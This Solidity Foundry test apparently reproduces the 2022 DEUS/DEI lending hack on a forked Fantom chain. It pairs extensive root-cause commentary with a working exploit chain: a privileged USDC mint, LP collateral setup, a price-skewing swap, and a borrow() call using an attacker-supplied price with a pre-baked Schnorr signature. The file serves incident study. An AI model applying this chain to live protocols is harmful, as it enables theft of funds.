// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// VULNERABILITY: Untrusted Off-Chain Price Attestation in DeiLenderSolidex.borrow() via Schnorr Signatures (2022-04 DEUS/DEI hack)
// 
// Root Cause:
// The lending contract `DeiLenderSolidex` (0x8D643d954798392403eeA19dB8108f595bB8B730) implements collateralized borrowing
// where the *user* supplies the `price` (valuation factor), `timestamp`, `reqId`, and `SchnorrSign[] sigs`.
// The contract performs a cryptographic verification of the Schnorr signatures (presumably checking that the provided
// `owner`+`nonce` produced a valid signature over a message that includes or is associated with price/timestamp/reqId),
// then uses the *caller-supplied* `price` to compute the value of posted collateral:
//   collateralValue = depositTokenBalance * price [scaled]
//   allowedBorrow = collateralValue * LTV
// If borrow amount <= allowed, it mints DEI to the borrower.
//
// Critically:
// - `IOracle(0x8129026c585bCfA530445a6267f9389057761A00).getOnChainPrice()` (which reads the manipulated Solidly
//   stable DEI/USDC pair) is called by the attacker but its result is *completely ignored* (only logged).
// - No on-chain price source, TWAP, Chainlink, or bound check against reserves is used inside borrow().
// - The signature scheme is the *sole* source of price truth. It is an off-chain MuSig/Schnorr multi-sig price feed.
// - Only 1 signature is supplied (sigs.length==1). Timestamp is user-chosen and warped to.
// - The `price` value (20_923_953_265_992_870_251_804_289) is attacker-chosen and does not need to match any on-chain observation.
// - Collateral (DepositToken) is an indirect receipt token from ILpDepositor over the DEI/USDC LP; its "value" is entirely
//   derived from the attested price rather than an on-chain redemption or virtual price query.
//
// Why the Attack Works:
// 1. Price attestation is decoupled from on-chain reality. A valid-looking Schnorr sig (from compromised signer key or
//    weak verification) for a high price is sufficient regardless of actual market price or posted asset composition.
// 2. Attacker can first acquire "cheap" collateral using a privileged mint (see below), provide it, then attest
//    a price high enough that the same nominal collateral now "covers" tens of millions of borrowed DEI.
// 3. The pre-borrow swap (USDC->DEI) both (a) acquires DEI balance and (b) skews the on-chain reserves so that
//    getOnChainPrice() would report an inflated number (if it were consulted by off-chain signers or the contract).
// 4. Schnorr verify likely reconstructs e.g. ecrecover(keccak256(abi.encode(price?, ts, reqId))) or equivalent;
//    because the sig was pre-baked and accepted, either (a) signer key 0xF096EC73cB49B024f1D93eFe893E38337E7a099a was
//    compromised, (b) the hash omitted `price` so any price + old sig for that ts/reqId worked (replay), or
//    (c) nonce/owner checks were insufficient or the MuSig threshold was 1.
// 5. No staleness window, no min/max price band relative to last known good price, no msg.sender binding on the attestation.
//
// Secondary Vector - Privileged Mint Bootstrap:
// - IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75).Swapin(...) is a privileged mint (normally for the bridge).
// - Pranking the known `owner_of_usdc` (0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE) allows the test (and the real attacker)
//   to mint 150M USDC with no backing. This seeds the entire position (buyDei + addLiquidity) "for free".
// - In production the attacker must have had (or also compromised) access to this caller, or abused a bridge bug
//   that exposed Swapin. After profit extraction the 150M is simply transferred back to the owner address.
//
// EXPLOIT STEPS:
// 1. Mint 150M fUSDC via privileged Swapin (prank owner_of_usdc).
// 2. sspv4.buyDei(1M USDC) -> receive ~1M DEI (protocol's 80% collateralized mint path).
// 3. router.addLiquidity(DEI, USDC, stable=true, large amounts) -> receive LP tokens (pair: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0).
// 4. LpDepositor.deposit(lpToken, amount) -> receive DepositToken (0xD82001B651F7fb67Db99C679133F384244e20E79) receipt.
// 5. DeiLenderSolidex.addCollateral(this, depositBalance) -> record collateral position.
// 6. router.swapExactTokensForTokensSimple(143.2M USDC, ..., USDC->DEI) -> acquire more DEI + skew pair price/oracle.
// 7. Construct SchnorrSign with hardcoded signature/owner/nonce (pre-baked for ts=1651113560, specific reqID).
//    Call cheat.warp(1651113560).
// 8. DeiLenderSolidex.borrow(this, 17.246M DEI, 20.923e24 "price", ts, repID, [sig]) -> verification passes using
//    attacker-controlled price; protocol mints ~17M unbacked DEI to attacker.
// 9. router.swapExact... (DEI->USDC) -> convert stolen DEI to USDC at the (now possibly still favorable) rate.
// 10. Transfer 150M USDC back to owner_of_usdc (repay the "seed"), leaving the profit in the contract.
//
// Impact:
// - Direct minting of ~17M+ DEI against collateral whose economic backing was ~1M USDC of self-provided LP at manipulated valuation.
// - Attacker extracts equivalent USDC (historically ~$13M+). The returned 150M USDC means the bridge mint is net-neutral;
//   the loss is entirely borne by DEI holders / the protocol via inflation of the synthetic.
// - The design conflates "cryptographically attested price from a signer" with "this price accurately reflects the
//   real-world or on-chain value of the specific collateral the user posted."
// - Any protocol using similar user-supplied signed prices for lending LTV without strong on-chain grounding or
//   conservative caps is vulnerable to the same class of attack if a signer key leaks or the verify is weak.
//
// References in this file:
// - borrow call at lines ~129-137
// - price fetch (ignored) + warp + sig construction at lines 121-128
// - collateral setup at lines 79-89
// - initial mint at lines 35-38
// - swap that manipulates price at lines 101-105
//
// The same marking exists in test/DeusDrain.sol (the self-contained playground version of the PoC).

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IBaseV1Router01 router = IBaseV1Router01(0xa38cd27185a464914D3046f0AB9d43356B34829D);

    IDeiLenderSolidex DeiLenderSolidex = IDeiLenderSolidex(0x8D643d954798392403eeA19dB8108f595bB8B730);

    IUSDC usdc = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    IERC20 dei = IERC20(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3);

    ISSPv4 sspv4 = ISSPv4(0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1);

    IERC20 lpToken = IERC20(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0);

    IERC20 DepositToken = IERC20(0xD82001B651F7fb67Db99C679133F384244e20E79);

    address owner_of_usdc = 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE;

    ILpDepositor LpDepositor = ILpDepositor(0x26E1A0d851CF28E697870e1b7F053B605C8b060F);

    IOracle oracle = IOracle(0x8129026c585bCfA530445a6267f9389057761A00);

    function setUp() public {
        cheat.createSelectFork("http://127.0.0.1:8552", 37_093_708); // fork fantom at block 37093708
    }

    function testExample() public {
        cheat.prank(owner_of_usdc);

        // VULNERABILITY MARKER: Privileged USDC mint bootstrap (seed capital with no cost)
        // Swapin is the bridge mint function. By controlling (or compromising) the owner_of_usdc EOA,
        // attacker obtains 150M USDC with zero backing. This capital is used to create the LP collateral
        // position cheaply. (Later returned in full; profit comes from the over-borrow.)
        usdc.Swapin(
            0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98, address(this), 150_000_000 * 10 ** 6
        );

        uint256 balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now", balance_of_usdc);

        usdc.approve(address(sspv4), type(uint256).max);

        sspv4.buyDei(1_000_000 * 10 ** 6);

        uint256 balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI after buying DEI", balance_of_dei);

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after buying DEI", balance_of_usdc);

        usdc.approve(address(router), type(uint256).max);

        dei.approve(address(router), type(uint256).max);

        // VULNERABILITY MARKER: Bootstrap collateral via LP -> DepositToken -> addCollateral
        // The LP is created with protocol-minted DEI (from buyDei) + attacker-minted USDC.
        // LpDepositor.deposit wraps it into DepositToken receipt (0xD82001B651...).
        // addCollateral merely records the receipt balance; *no* on-chain valuation of the LP happens here.
        // Valuation is deferred entirely to the later borrow() call using the attacker-supplied price.
        router.addLiquidity(
            address(dei),
            address(usdc),
            true,
            894_048_109_294_000_000_000_000,
            965_495_000_000,
            876_167_147_108_120_000_000_000,
            946_185_100_000,
            address(this),
            block.timestamp
        );

        uint256 balance_of_LpToken = lpToken.balanceOf(address(this));

        emit log_named_uint("The LPToken After adding Liquidity", balance_of_LpToken);

        lpToken.approve(address(LpDepositor), type(uint256).max);

        LpDepositor.deposit(address(lpToken), balance_of_LpToken);

        balance_of_LpToken = lpToken.balanceOf(address(this));

        uint256 balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After depositting LPtoken", balance_of_DepositToken);

        DepositToken.approve(address(DeiLenderSolidex), type(uint256).max);

        DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);

        balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After addCollateral", balance_of_DepositToken);

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now", balance_of_usdc);

        usdc.approve(address(router), type(uint256).max);

        // VULNERABILITY MARKER: Price manipulation + untrusted attestation consumption
        // This swap (USDC for DEI) has two effects:
        //   a) Attacker receives a large DEI balance (later swapped back for profit).
        //   b) Dramatically changes reserves in the stable pair (0x5821..), which an on-chain oracle
        //      (IOracle.getOnChainPrice) would use to derive a now-inflated "DEI price".
        // The returned `price` is logged but *never passed* to borrow(). Instead a much larger
        // attacker-chosen constant (20.92e24) is supplied together with a matching pre-baked Schnorr sig.
        router.swapExactTokensForTokensSimple(
            143_200_000_000_000, 0, address(usdc), address(dei), true, address(this), block.timestamp
        );

        balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI I have after swapping", balance_of_dei);

        // VULNERABILITY MARKER: Forged / replayed Schnorr price attestation
        // The signature, owner, nonce, reqID and timestamp are all attacker-controlled values.
        // The contract will accept them because its borrow() only checks cryptographic validity of
        // the Schnorr proof against the supplied (price, timestamp, reqId), not that:
        //   - price reflects any on-chain observation or the just-fetched oracle price
        //   - timestamp is recent (warp makes block.timestamp == 1651113560)
        //   - the collateral's *actual* backing matches the valuation
        //   - the sig was freshly produced for *this* borrow / this collateral position
        SchnorrSign memory sig = SchnorrSign(
            1_835_036_472_718_200_664_753_898_924_933_875_196_349_373_787_186_253_604_571_797_551_094_739_683_650,
            0xF096EC73cB49B024f1D93eFe893E38337E7a099a,
            0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF
        );

        SchnorrSign[] memory sigs = new SchnorrSign[](1);

        sigs[0] = sig;

        bytes memory repID = "0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040";

        uint256 price = oracle.getOnChainPrice();

        emit log_named_uint("The price from Oracle", price);

        cheat.warp(1_651_113_560);

        emit log_named_uint("the time now", block.timestamp);

        // VULNERABILITY MARKER: The fatal borrow() call (core of the exploit)
        // With the (fake) high price attestation, the posted ~965k-USDC + 894k-DEI LP collateral
        // is valued high enough to justify minting 17.2M DEI to the attacker.
        // Because price came from the attestation and not from reserves or a safe oracle,
        // the LTV check is meaningless.
        DeiLenderSolidex.borrow(
            address(this),
            17_246_885_701_212_305_622_476_302,
            20_923_953_265_992_870_251_804_289,
            1_651_113_560,
            repID,
            sigs
        );

        balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI after borrowing", balance_of_dei);

        router.swapExactTokensForTokensSimple(
            12_000_000_000_000_000_000_000_000, 0, address(dei), address(usdc), true, address(this), block.timestamp
        );

        // VULNERABILITY MARKER: Profit extraction + "repay" of seed capital
        // The large DEI received from the over-borrow is converted back to USDC via the (still
        // manipulated) pair. The original 150M USDC seed is sent back to owner_of_usdc (neutralizing
        // the privileged mint from the bridge's perspective). The residual USDC balance is pure profit
        // extracted from the protocol's erroneous DEI mint.
        usdc.transfer(owner_of_usdc, 150_000_000 * 10 ** 6);

        balance_of_dei = dei.balanceOf(address(this));

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after paying back", balance_of_usdc);

        emit log_named_uint("The DEI after paying back", balance_of_dei);
    }
}
